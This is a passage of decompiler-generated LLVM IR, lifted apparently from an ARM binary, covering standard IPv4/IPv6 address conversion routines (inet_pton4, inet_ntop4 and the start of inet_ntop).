  store i8 %v1_1bc5c, i8* %v4_1bc5c, align 1
  store i32 0, i32* @r7, align 4
  %v0_1bc64 = load i32, i32* @r3, align 4
  %v1_1bc64 = add i32 %v0_1bc64, 1
  store i32 %v1_1bc64, i32* @r6, align 4
  %v0_1bc68 = load i32, i32* @r5, align 4
  store i32 %v0_1bc68, i32* %sl.global-to-local, align 4
  store i32 0, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_1bca4.backedge

dec_label_pc_1bc74:                               ; preds = %dec_label_pc_1bc14
  %v7_1bc74 = icmp eq i32 %v0_1bc14, 46
  br i1 %v7_1bc74, label %dec_label_pc_1bc7c, label %dec_label_pc_1bd40

dec_label_pc_1bc7c:                               ; preds = %dec_label_pc_1bc74
  %v0_1bc7c = load i32, i32* @r6, align 4
  %v1_1bc7c = add i32 %v0_1bc7c, 4
  store i32 %v1_1bc7c, i32* @r4, align 4
  %v1_1bc80 = load i32, i32* %r8.global-to-local, align 4
  %tmp38 = icmp ugt i32 %v1_1bc7c, %v1_1bc80
  br i1 %tmp38, label %dec_label_pc_1bd40, label %dec_label_pc_1bc88

dec_label_pc_1bc88:                               ; preds = %dec_label_pc_1bc7c
  %v0_1bc88 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_1bc88, i32* @r0, align 4
  store i32 %v0_1bc7c, i32* %r1.global-to-local, align 4
  %v3_1bc90 = call i32 @inet_pton4(i32 %v0_1bc88, i32 %v0_1bc7c)
  %v5_1bc98 = icmp sgt i32 %v3_1bc90, 0
  br i1 %v5_1bc98, label %dec_label_pc_1bc88.dec_label_pc_1bcdc_crit_edge, label %dec_label_pc_1bd40

dec_label_pc_1bc88.dec_label_pc_1bcdc_crit_edge:  ; preds = %dec_label_pc_1bc88
  %v0_1bd20.pre.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1bcdc

dec_label_pc_1bca0:                               ; preds = %dec_label_pc_1bbf8
  store i32 1, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_1bca4.backedge

dec_label_pc_1bca4.backedge:                      ; preds = %dec_label_pc_1bca0, %dec_label_pc_1bc2c, %dec_label_pc_1bc50
  %v0_1bca4 = phi i32 [ %v1_1bbf0, %dec_label_pc_1bca0 ], [ %v1_1bbf0, %dec_label_pc_1bc2c ], [ %v0_1bc68, %dec_label_pc_1bc50 ]
  %v0_1bcb012 = phi i32 [ 1, %dec_label_pc_1bca0 ], [ 0, %dec_label_pc_1bc2c ], [ 0, %dec_label_pc_1bc50 ]
  %v1_1bca4 = inttoptr i32 %v0_1bca4 to i8*
  %v2_1bca4 = load i8, i8* %v1_1bca4, align 1
  %v3_1bca4 = zext i8 %v2_1bca4 to i32
  store i32 %v3_1bca4, i32* @r4, align 4
  %v2_1bca8 = icmp eq i8 %v2_1bca4, 0
  br i1 %v2_1bca8, label %dec_label_pc_1bcb0, label %dec_label_pc_1bca4.backedge.dec_label_pc_1bbe0_crit_edge

dec_label_pc_1bca4.backedge.dec_label_pc_1bbe0_crit_edge: ; preds = %dec_label_pc_1bca4.backedge
  %v2_1bbe0.pre = load i32, i32* %stack_var_-64, align 4
  br label %dec_label_pc_1bbe0

dec_label_pc_1bcb0:                               ; preds = %dec_label_pc_1bca4.backedge
  %v0_1bcb4.pre = load i32, i32* @r6, align 4
  %v2_1bcb0 = icmp eq i32 %v0_1bcb012, 0
  store i32 %v0_1bcb4.pre, i32* @r4, align 4
  br i1 %v2_1bcb0, label %dec_label_pc_1bcdc, label %dec_label_pc_1bcbc

dec_label_pc_1bcbc:                               ; preds = %dec_label_pc_1bcb0
  %v1_1bcbc = add i32 %v0_1bcb4.pre, 2
  store i32 %v1_1bcbc, i32* %r3.global-to-local, align 4
  %v1_1bcc0 = load i32, i32* %r8.global-to-local, align 4
  %tmp39 = icmp ugt i32 %v1_1bcbc, %v1_1bcc0
  br i1 %tmp39, label %dec_label_pc_1bd40, label %dec_label_pc_1bcc8

dec_label_pc_1bcc8:                               ; preds = %dec_label_pc_1bcbc
  store i32 %v0_1bcb4.pre, i32* %r3.global-to-local, align 4
  %v0_1bccc = load i32, i32* @r7, align 4
  %v3_1bccc = udiv i32 %v0_1bccc, 256
  store i32 %v3_1bccc, i32* %r2.global-to-local, align 4
  %v1_1bcd0 = trunc i32 %v3_1bccc to i8
  %v3_1bcd0 = inttoptr i32 %v0_1bcb4.pre to i8*
  store i8 %v1_1bcd0, i8* %v3_1bcd0, align 1
  %v4_1bcd0 = load i32, i32* %r3.global-to-local, align 4
  %v5_1bcd0 = add i32 %v4_1bcd0, 1
  store i32 %v5_1bcd0, i32* @r3, align 4
  %v0_1bcd4 = load i32, i32* @r7, align 4
  %v1_1bcd4 = trunc i32 %v0_1bcd4 to i8
  %v2_1bcd4 = load i32, i32* @r6, align 4
  %v3_1bcd4 = add i32 %v2_1bcd4, 1
  %v4_1bcd4 = inttoptr i32 %v3_1bcd4 to i8*
  store i8 %v1_1bcd4, i8* %v4_1bcd4, align 1
  %v0_1bcd8 = load i32, i32* @r3, align 4
  %v1_1bcd8 = add i32 %v0_1bcd8, 1
  store i32 %v1_1bcd8, i32* @r4, align 4
  br label %dec_label_pc_1bcdc

dec_label_pc_1bcdc:                               ; preds = %dec_label_pc_1bc88.dec_label_pc_1bcdc_crit_edge, %dec_label_pc_1bcb0.thread, %dec_label_pc_1bcb0, %dec_label_pc_1bcc8
  %v0_1bd20.pre = phi i32 [ %v0_1bd20.pre.pre, %dec_label_pc_1bc88.dec_label_pc_1bcdc_crit_edge ], [ %v3_1bb9c, %dec_label_pc_1bcb0.thread ], [ %v0_1bcb4.pre, %dec_label_pc_1bcb0 ], [ %v1_1bcd8, %dec_label_pc_1bcc8 ]
  %v0_1bcdc = load i32, i32* %fp.global-to-local, align 4
  %v2_1bcdc = icmp eq i32 %v0_1bcdc, 0
  %v1_1bd20.pre = load i32, i32* %r8.global-to-local, align 4
  br i1 %v2_1bcdc, label %dec_label_pc_1bd20, label %dec_label_pc_1bce4

dec_label_pc_1bce4:                               ; preds = %dec_label_pc_1bcdc
  %v9_1bce4 = icmp eq i32 %v0_1bd20.pre, %v1_1bd20.pre
  %v2_1bce8 = sub i32 %v0_1bd20.pre, %v0_1bcdc
  store i32 %v2_1bce8, i32* @ip, align 4
  br i1 %v9_1bce4, label %dec_label_pc_1bd40, label %dec_label_pc_1bd08.preheader

dec_label_pc_1bd08.preheader:                     ; preds = %dec_label_pc_1bce4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  br label %dec_label_pc_1bd08

dec_label_pc_1bcfc:                               ; preds = %dec_label_pc_1bd08
  %v2_1bd10 = sub i32 %v0_1bd1c, %v0_1bd14
  %v0_1bcfc = load i32, i32* %fp.global-to-local, align 4
  %v2_1bcfc = add i32 %v0_1bcfc, %v2_1bd0c
  %v3_1bcfc = inttoptr i32 %v2_1bcfc to i8*
  %v4_1bcfc = load i8, i8* %v3_1bcfc, align 1
  %v6_1bcfc = zext i8 %v4_1bcfc to i32
  store i32 %v6_1bcfc, i32* @r3, align 4
  %v3_1bd00 = inttoptr i32 %v2_1bd10 to i8*
  store i8 %v4_1bcfc, i8* %v3_1bd00, align 1
  %v0_1bd04 = load i32, i32* @lr, align 4
  %v1_1bd04 = trunc i32 %v0_1bd04 to i8
  %v2_1bd04 = load i32, i32* %fp.global-to-local, align 4
  %v3_1bd04 = load i32, i32* %r1.global-to-local, align 4
  %v4_1bd04 = add i32 %v3_1bd04, %v2_1bd04
  %v5_1bd04 = inttoptr i32 %v4_1bd04 to i8*
  store i8 %v1_1bd04, i8* %v5_1bd04, align 1
  %v0_1bd08.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1bd08.pre = load i32, i32* @ip, align 4
  %v1_1bd10.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1bd08

dec_label_pc_1bd08:                               ; preds = %dec_label_pc_1bd08.preheader, %dec_label_pc_1bcfc
  %v0_1bd1c = phi i32 [ %v1_1bd20.pre, %dec_label_pc_1bd08.preheader ], [ %v1_1bd10.pre, %dec_label_pc_1bcfc ]
  %v1_1bd0c = phi i32 [ %v2_1bce8, %dec_label_pc_1bd08.preheader ], [ %v1_1bd08.pre, %dec_label_pc_1bcfc ]
  %v0_1bd14 = phi i32 [ 1, %dec_label_pc_1bd08.preheader ], [ %v0_1bd08.pre, %dec_label_pc_1bcfc ]
  %v2_1bd08 = sub i32 %v0_1bd14, %v1_1bd0c
  %v4_1bd08 = xor i32 %v0_1bd14, %v1_1bd0c
  %v5_1bd08 = xor i32 %v2_1bd08, %v0_1bd14
  %v6_1bd08 = and i32 %v5_1bd08, %v4_1bd08
  %v7_1bd08 = icmp slt i32 %v6_1bd08, 0
  %v8_1bd08 = icmp slt i32 %v2_1bd08, 0
  %v9_1bd08 = icmp eq i32 %v0_1bd14, %v1_1bd0c
  %v2_1bd0c = sub i32 %v1_1bd0c, %v0_1bd14
  store i32 %v2_1bd0c, i32* %r1.global-to-local, align 4
  %v1_1bd14 = add i32 %v0_1bd14, 1
  store i32 %v1_1bd14, i32* %r2.global-to-local, align 4
  %v3_1bd18 = xor i1 %v8_1bd08, %v7_1bd08
  %v4_1bd18 = or i1 %v9_1bd08, %v3_1bd18
  br i1 %v4_1bd18, label %dec_label_pc_1bcfc, label %dec_label_pc_1bd1c

dec_label_pc_1bd1c:                               ; preds = %dec_label_pc_1bd08
  store i32 %v0_1bd1c, i32* @r4, align 4
  br label %dec_label_pc_1bd20

dec_label_pc_1bd20:                               ; preds = %dec_label_pc_1bcdc, %dec_label_pc_1bd1c
  %v0_1bd20 = phi i32 [ %v0_1bd1c, %dec_label_pc_1bd1c ], [ %v0_1bd20.pre, %dec_label_pc_1bcdc ]
  %v1_1bd20 = phi i32 [ %v0_1bd1c, %dec_label_pc_1bd1c ], [ %v1_1bd20.pre, %dec_label_pc_1bcdc ]
  %v9_1bd20 = icmp eq i32 %v0_1bd20, %v1_1bd20
  br i1 %v9_1bd20, label %dec_label_pc_1bd28, label %dec_label_pc_1bd40

dec_label_pc_1bd28:                               ; preds = %dec_label_pc_1bd20
  store i32 %arg3, i32* @r0, align 4
  store i32 %v2_1bb90, i32* @r1, align 4
  store i32 16, i32* @r2, align 4
  %v0_1bd34 = call i32 @memcpy()
  br label %dec_label_pc_1bd58

dec_label_pc_1bd40:                               ; preds = %dec_label_pc_1bbf8, %dec_label_pc_1bc24, %dec_label_pc_1bc44, %dec_label_pc_1bc38, %dec_label_pc_1bce4, %dec_label_pc_1bc88, %dec_label_pc_1bc74, %dec_label_pc_1bd20, %dec_label_pc_1bbb4, %dec_label_pc_1bcbc, %dec_label_pc_1bc7c
  br label %dec_label_pc_1bd58

dec_label_pc_1bd48:                               ; preds = %dec_label_pc_1bb74
  %v0_1bd48 = call i32 @__GI___errno_location()
  store i32 97, i32* %r3.global-to-local, align 4
  %v2_1bd50 = inttoptr i32 %v0_1bd48 to i32*
  store i32 97, i32* %v2_1bd50, align 4
  br label %dec_label_pc_1bd58

dec_label_pc_1bd58:                               ; preds = %dec_label_pc_1bd40, %dec_label_pc_1bd28, %dec_label_pc_1bb80, %dec_label_pc_1bd48
  %v1_1bd60 = phi i32 [ 0, %dec_label_pc_1bd40 ], [ 1, %dec_label_pc_1bd28 ], [ %v3_1bb88, %dec_label_pc_1bb80 ], [ -1, %dec_label_pc_1bd48 ]
  store i32 %v3_1bb54, i32* @r4, align 4
  store i32 %v6_1bb54, i32* @r5, align 4
  store i32 %v9_1bb54, i32* @r6, align 4
  store i32 %v12_1bb54, i32* @r7, align 4
  store i32 %v27_1bb54, i32* @lr, align 4
  ret i32 %v1_1bd60

; uselistorder directives
  uselistorder i32 %v2_1bd0c, { 1, 0 }
  uselistorder i32 %v2_1bd08, { 1, 0 }
  uselistorder i32 %v0_1bd14, { 2, 3, 6, 0, 1, 5, 4 }
  uselistorder i32 %v1_1bd0c, { 1, 3, 0, 2 }
  uselistorder i32 %v0_1bd1c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1bd20.pre, { 0, 2, 1 }
  uselistorder i32 %v0_1bd20.pre, { 2, 0, 1 }
  uselistorder i32 %v3_1bccc, { 1, 0 }
  uselistorder i32 %v0_1bcb4.pre, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v3_1bca4, { 1, 0 }
  uselistorder i32 %v0_1bc7c, { 1, 0, 2 }
  uselistorder i32 %v3_1bc50, { 1, 0 }
  uselistorder i32 %v0_1bc44, { 1, 0, 2 }
  uselistorder i32 %v1_1bbf0, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v2_1bbe0, { 1, 0 }
  uselistorder i32 %v0_1bbcc, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2, 3 }
  uselistorder i32* %sl.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r8.global-to-local, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32* %r3.global-to-local, { 0, 2, 3, 1, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r2.global-to-local, { 2, 1, 3, 4, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 1, 3, 4, 5, 6, 0 }
  uselistorder i32* %fp.global-to-local, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 (i32, i32)* @inet_pton4, { 1, 0 }
  uselistorder i32 %arg3, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_1bd58, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1bd40, { 7, 4, 9, 5, 10, 6, 2, 3, 1, 0, 8 }
  uselistorder label %dec_label_pc_1bd20, { 1, 0 }
  uselistorder label %dec_label_pc_1bd08, { 1, 0 }
  uselistorder label %dec_label_pc_1bcdc, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_1bca4.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1bbe0, { 1, 0 }
}

define i32 @inet_ntop4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-57 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 %arg1, i32* %fp.global-to-local, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 %arg3, i32* %stack_var_-72, align 4
  store i32 0, i32* %stack_var_-57, align 4
  %v2_1be48 = ptrtoint i32* %stack_var_-40 to i32
  %v2_1be28 = add i32 %v2_1be48, -17
  br label %dec_label_pc_1be48

dec_label_pc_1bd98:                               ; preds = %dec_label_pc_1be48
  %v0_1bd98 = load i32, i32* %fp.global-to-local, align 4
  %v2_1bd98 = add i32 %v0_1bd98, %v1_1bd98
  %v3_1bd98 = inttoptr i32 %v2_1bd98 to i8*
  %v4_1bd98 = load i8, i8* %v3_1bd98, align 1
  %v6_1bd98 = zext i8 %v4_1bd98 to i32
  store i32 %v6_1bd98, i32* %r4.global-to-local, align 4
  %div4 = udiv i8 %v4_1bd98, 100
  %v2_1bda0 = zext i8 %div4 to i32
  store i32 %v2_1bda0, i32* %r0.global-to-local, align 4
  %v1_1bda4 = or i8 %div4, 48
  %v3_1bda8 = add i32 %v2_1be58, -17
  %v4_1bda8 = inttoptr i32 %v3_1bda8 to i8*
  store i8 %v1_1bda4, i8* %v4_1bda8, align 1
  %v0_1bdac = load i32, i32* %r5.global-to-local, align 4
  %v1_1bdac = add i32 %v0_1bdac, -17
  %v2_1bdac = inttoptr i32 %v1_1bdac to i8*
  %v3_1bdac = load i8, i8* %v2_1bdac, align 1
  %v0_1bdb0 = load i32, i32* %r6.global-to-local, align 4
  %v1_1bdb0 = add i32 %v0_1bdb0, 1
  store i32 %v1_1bdb0, i32* %r6.global-to-local, align 4
  store i32 %v2_1be48, i32* %r2.global-to-local, align 4
  %v7_1bdb8 = icmp eq i8 %v3_1bdac, 48
  %v0_1bdc0 = load i32, i32* %r4.global-to-local, align 4
  %v0_1bdc8 = load i32, i32* %fp.global-to-local, align 4
  %v1_1bdc8 = load i32, i32* %sl.global-to-local, align 4
  %v2_1bdc8 = add i32 %v1_1bdc8, %v0_1bdc8
  store i32 %v2_1bdc8, i32* %sb.global-to-local, align 4
  %v2_1bdd0 = udiv i32 %v0_1bdc0, 10
  %v1_1bdd8 = urem i32 %v2_1bdd0, 256
  %v2_1bddc = udiv i32 %v1_1bdd8, 10
  %v3_1bddc = urem i32 %v1_1bdd8, 10
  store i32 %v2_1bddc, i32* %r0.global-to-local, align 4
  %v1_1bde0 = or i32 %v3_1bddc, 48
  br i1 %v7_1bdb8, label %dec_label_pc_1bdd0, label %dec_label_pc_1bdf8

dec_label_pc_1bdd0:                               ; preds = %dec_label_pc_1bd98
  %v7_1bde8 = icmp eq i32 %v1_1bde0, 48
  br i1 %v7_1bde8, label %bb18, label %bb

bb:                                               ; preds = %dec_label_pc_1bdd0
  store i32 %v1_1bdb0, i32* %r7.global-to-local, align 4
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_1bdd0, %bb
  %v1_1bdf0 = trunc i32 %v1_1bde0 to i8
  store i8 %v1_1bdf0, i8* %v2_1bdac, align 1
  %v0_1be24.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1be14

dec_label_pc_1bdf8:                               ; preds = %dec_label_pc_1bd98
  %v2_1bdc4 = add i32 %v1_1bdb0, %v2_1be48
  %v1_1be0c = trunc i32 %v1_1bde0 to i8
  %v3_1be0c = add i32 %v2_1bdc4, -17
  %v4_1be0c = inttoptr i32 %v3_1be0c to i8*
  store i8 %v1_1be0c, i8* %v4_1be0c, align 1
  %v0_1be10 = load i32, i32* %r6.global-to-local, align 4
  %v1_1be10 = add i32 %v0_1be10, 1
  store i32 %v1_1be10, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1be14

dec_label_pc_1be14:                               ; preds = %bb18, %dec_label_pc_1bdf8
  %v0_1be24 = phi i32 [ %v0_1be24.pre, %bb18 ], [ %v1_1be10, %dec_label_pc_1bdf8 ]
  %v0_1be14 = load i32, i32* %sb.global-to-local, align 4
  %v1_1be14 = inttoptr i32 %v0_1be14 to i8*
  %v2_1be14 = load i8, i8* %v1_1be14, align 1
  %tmp19 = urem i8 %v2_1be14, 10
  store i32 %v2_1be48, i32* %ip.global-to-local, align 4
  %v1_1be24 = add i32 %v0_1be24, 1
  store i32 %v1_1be24, i32* %r0.global-to-local, align 4
  %v1_1be2c = or i8 %tmp19, 48
  %v3_1be30 = add i32 %v2_1be28, %v0_1be24
  %v4_1be30 = inttoptr i32 %v3_1be30 to i8*
  store i8 %v1_1be2c, i8* %v4_1be30, align 1
  %v0_1be34 = load i32, i32* %ip.global-to-local, align 4
  %v1_1be34 = load i32, i32* %r0.global-to-local, align 4
  %v2_1be34 = add i32 %v1_1be34, %v0_1be34
  store i32 %v2_1be34, i32* %r2.global-to-local, align 4
  %v3_1be3c = add i32 %v2_1be34, -17
  %v4_1be3c = inttoptr i32 %v3_1be3c to i8*
  store i8 46, i8* %v4_1be3c, align 1
  %v0_1be40 = load i32, i32* %r0.global-to-local, align 4
  %v1_1be40 = add i32 %v0_1be40, 1
  store i32 %v1_1be40, i32* %r6.global-to-local, align 4
  %v0_1be44 = load i32, i32* %sl.global-to-local, align 4
  %v1_1be44 = add i32 %v0_1be44, 1
  store i32 %v1_1be44, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_1be48

dec_label_pc_1be48:                               ; preds = %entry, %dec_label_pc_1be14
  %v0_1be54 = phi i32 [ 0, %entry ], [ %v1_1be40, %dec_label_pc_1be14 ]
  %v1_1bd98 = phi i32 [ 0, %entry ], [ %v1_1be44, %dec_label_pc_1be14 ]
  store i32 %v2_1be48, i32* %ip.global-to-local, align 4
  store i32 %v0_1be54, i32* %r7.global-to-local, align 4
  %v2_1be58 = add i32 %v0_1be54, %v2_1be48
  store i32 %v2_1be58, i32* %r5.global-to-local, align 4
  %v7_1be5c = icmp sgt i32 %v1_1bd98, 3
  br i1 %v7_1be5c, label %dec_label_pc_1be60, label %dec_label_pc_1bd98

dec_label_pc_1be60:                               ; preds = %dec_label_pc_1be48
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_1be64 = ptrtoint i32* %stack_var_-57 to i32
  store i32 %v2_1be64, i32* %r4.global-to-local, align 4
  %v3_1be68 = add i32 %v2_1be58, -18
  %v4_1be68 = inttoptr i32 %v3_1be68 to i8*
  store i8 0, i8* %v4_1be68, align 1
  %tmp20 = bitcast i32* %stack_var_-57 to i8*
  store i32 %v2_1be64, i32* %r0.global-to-local, align 4
  %v3_1be70 = call i32 @strlen(i8* %tmp20)
  store i32 %v3_1be70, i32* %r0.global-to-local, align 4
  %v2_1be74 = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_1be74, i32* %r2.global-to-local, align 4
  %tmp = icmp ugt i32 %v3_1be70, %v2_1be74
  br i1 %tmp, label %dec_label_pc_1be80, label %dec_label_pc_1be94

dec_label_pc_1be80:                               ; preds = %dec_label_pc_1be60
  %v0_1be80 = call i32 @__GI___errno_location()
  store i32 %v0_1be80, i32* %r0.global-to-local, align 4
  %v0_1be88 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_1be88, i32* %r2.global-to-local, align 4
  %v2_1be8c = inttoptr i32 %v0_1be80 to i32*
  store i32 28, i32* %v2_1be8c, align 4
  %v0_1bea4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1bea4

dec_label_pc_1be94:                               ; preds = %dec_label_pc_1be60
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 %v2_1be64, i32* @r1, align 4
  %v2_1be9c = inttoptr i32 %arg2 to i8*
  %v3_1be9c = call i32 @strcpy(i8* %v2_1be9c, i32 %v2_1be64)
  store i32 %v3_1be9c, i32* %r0.global-to-local, align 4
  store i32 %v3_1be9c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1bea4

dec_label_pc_1bea4:                               ; preds = %dec_label_pc_1be80, %dec_label_pc_1be94
  %v0_1bea4 = phi i32 [ %v0_1bea4.pre, %dec_label_pc_1be80 ], [ %v3_1be9c, %dec_label_pc_1be94 ]
  store i32 %v0_1bea4, i32* %r0.global-to-local, align 4
  ret i32 %v0_1bea4

; uselistorder directives
  uselistorder i32 %v0_1bea4, { 1, 0 }
  uselistorder i32 %v2_1be64, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1be58, { 0, 2, 1 }
  uselistorder i32 %v1_1bd98, { 1, 0 }
  uselistorder i32 %v1_1bde0, { 1, 0, 2 }
  uselistorder i32 %v2_1be48, { 0, 5, 3, 2, 4, 1 }
  uselistorder i32* %stack_var_-57, { 0, 2, 1 }
  uselistorder i32* %r7.global-to-local, { 3, 0, 2, 1 }
  uselistorder i32* %r5.global-to-local, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 5, 4, 6, 11, 7, 8, 9, 10, 2, 1, 0 }
  uselistorder i32* %ip.global-to-local, { 2, 0, 1 }
  uselistorder i8 48, { 0, 6, 1, 4, 7, 8, 9, 10, 11, 2, 3, 12, 5 }
  uselistorder i32 -17, { 2, 3, 4, 5, 0, 6, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_1bea4, { 1, 0 }
  uselistorder label %dec_label_pc_1be48, { 1, 0 }
  uselistorder label %dec_label_pc_1be14, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
}

define i32 @__GI_inet_ntop(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-118 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %v6_1beb4 = load i32, i32* @r5, align 4
  %v7_1bec0 = icmp eq i32 %arg1, 2
  store i1 %v7_1bec0, i1* %cpsr_z.global-to-local, align 1
  store i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32* @r5, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 %arg4, i32* %stack_var_-128, align 4
  br i1 %v7_1bec0, label %dec_label_pc_1bee4, label %dec_label_pc_1bed8

dec_label_pc_1bed8:                               ; preds = %entry
  %v7_1bed8 = icmp eq i32 %arg1, 10
  store i1 %v7_1bed8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1bed8, label %dec_label_pc_1bef8, label %dec_label_pc_1c10c

dec_label_pc_1bee4:                               ; preds = %entry
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 %arg4, i32* %r2.global-to-local, align 4
  %v3_1bef0 = call i32 @inet_ntop4(i32 %arg2, i32 %arg3, i32 %arg4)
  br label %dec_label_pc_1c104

dec_label_pc_1bef8:                               ; preds = %dec_label_pc_1bed8
  %v2_1bef8 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_1bef8, i32* %r0.global-to-local, align 4
  store i32 32, i32* @r2, align 4
  %v2_1bf04 = bitcast i32* %stack_var_-72 to i8*
  %v3_1bf04 = call i32 @__GI_memset(i8* %v2_1bf04, i32 0)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_1bf28 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_1bf0c

dec_label_pc_1bf0c:                               ; preds = %dec_label_pc_1bf0c.dec_label_pc_1bf0c_crit_edge, %dec_label_pc_1bef8
  %v0_1bf24 = phi i32 [ %v0_1bf0c.pre, %dec_label_pc_1bf0c.dec_label_pc_1bf0c_crit_edge ], [ 0, %dec_label_pc_1bef8 ]
  %v1_1bf0c = load i32, i32* @r8, align 4
  %v2_1bf0c = add i32 %v1_1bf0c, %v0_1bf24
  %v3_1bf10 = inttoptr i32 %v2_1bf0c to i8*
  %v4_1bf10 = load i8, i8* %v3_1bf10, align 1
  %v6_1bf10 = zext i8 %v4_1bf10 to i32
  %v1_1bf14 = add i32 %v2_1bf0c, 1
  %v2_1bf14 = inttoptr i32 %v1_1bf14 to i8*
  %v3_1bf14 = load i8, i8* %v2_1bf14, align 1
  %v4_1bf14 = zext i8 %v3_1bf14 to i32
  %tmp74 = icmp slt i32 %v0_1bf24, 0
  %v4_1bf18 = zext i1 %tmp74 to i32
  %v5_1bf18 = add i32 %v4_1bf18, %v0_1bf24
  %v4_1bf1c = mul nuw nsw i32 %v6_1bf10, 256
  %v5_1bf1c = or i32 %v4_1bf14, %v4_1bf1c
  store i32 %v5_1bf1c, i32* %r2.global-to-local, align 4
  %v3_1bf20 = sdiv i32 %v5_1bf18, 2
  %v1_1bf24 = add i32 %v0_1bf24, 2
  store i32 %v1_1bf24, i32* %r0.global-to-local, align 4
  %v4_1bf2c = mul i32 %v3_1bf20, 4
  %v5_1bf2c = add i32 %v4_1bf2c, %v2_1bf28
  %v7_1bf30 = icmp eq i32 %v1_1bf24, 15
  store i1 %v7_1bf30, i1* %cpsr_z.global-to-local, align 1
  %v2_1bf34 = add i32 %v5_1bf2c, -32
  %v3_1bf34 = inttoptr i32 %v2_1bf34 to i32*
  store i32 %v5_1bf1c, i32* %v3_1bf34, align 4
  %v7_1bf38 = icmp sgt i32 %v1_1bf24, 15
  br i1 %v7_1bf38, label %dec_label_pc_1bf3c, label %dec_label_pc_1bf0c.dec_label_pc_1bf0c_crit_edge

dec_label_pc_1bf0c.dec_label_pc_1bf0c_crit_edge:  ; preds = %dec_label_pc_1bf0c
  %v0_1bf0c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1bf0c

dec_label_pc_1bf3c:                               ; preds = %dec_label_pc_1bf0c
  store i32 -1, i32* @r6, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1bf54

dec_label_pc_1bf54:                               ; preds = %dec_label_pc_1bf3c, %dec_label_pc_1bfa0
  %v0_1bf94 = phi i32 [ -1, %dec_label_pc_1bf3c ], [ %v0_1bfc8, %dec_label_pc_1bfa0 ]
  %v0_1bf84 = phi i32 [ -1, %dec_label_pc_1bf3c ], [ %v0_1bfb4, %dec_label_pc_1bfa0 ]
  %v0_1bf68 = phi i32 [ -1, %dec_label_pc_1bf3c ], [ %v0_1bf687, %dec_label_pc_1bfa0 ]
  %v0_1bfa0 = phi i32 [ 0, %dec_label_pc_1bf3c ], [ %v1_1bfa0, %dec_label_pc_1bfa0 ]
  %v4_1bf58 = mul nuw nsw i32 %v0_1bfa0, 4
  %v5_1bf58 = add i32 %v4_1bf58, %v2_1bf28
  %v1_1bf5c = add i32 %v5_1bf58, -32
  %v2_1bf5c = inttoptr i32 %v1_1bf5c to i32*
  %v3_1bf5c = load i32, i32* %v2_1bf5c, align 4
  %v2_1bf60 = icmp eq i32 %v3_1bf5c, 0
